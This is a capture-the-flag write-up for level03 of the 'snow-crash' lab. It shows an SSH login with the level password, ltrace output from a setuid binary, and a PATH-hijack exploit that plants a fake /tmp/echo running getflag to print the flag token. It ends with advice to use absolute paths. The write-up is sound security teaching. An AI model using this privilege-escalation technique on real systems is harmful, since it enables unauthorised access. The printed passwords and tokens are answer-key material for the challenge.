# Level03

Login as `level03`

```bash
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level03
level03@192.168.1.64's password: kooda2puivaav1idi4f57q8iq
```

We have an executable file in the home directory -> *Exploit me*

```bash
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03
Exploit me
```

The **s** permission on it tells us that this file always executes **as the user who owns the file**, `regardless` of the **user actually passing the command**.

Which also means there's no need to `su flag03` as the file can do it on its own.

We use `ltrace` on the file.

>ltrace is a program that simply runs the specified command until it exits.  It intercepts and records the dynamic library calls which are called by the executed process and the signals which are received by that process.  It can also intercept and print the system calls executed by the program."

From ltrace man page.

```bash
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid() = 2003
geteuid() = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                             = 0
+++ exited (status 0) +++
```

We notice that echo is executed with a **relative path**: `system("/usr/bin/env echo Exploit me")`. Which is a common path vulnerability.

For instance, the real echo can be faked with either a script or a symlink.

```bash
level03@SnowCrash:~$ vi /tmp/echo
#!/bin/bash
/bin/getflag
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ export PATH="/tmp:$PATH"
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

It is recommended to execute binaries using an **absolute path** to avoid this kind of vulnerabilities 🙂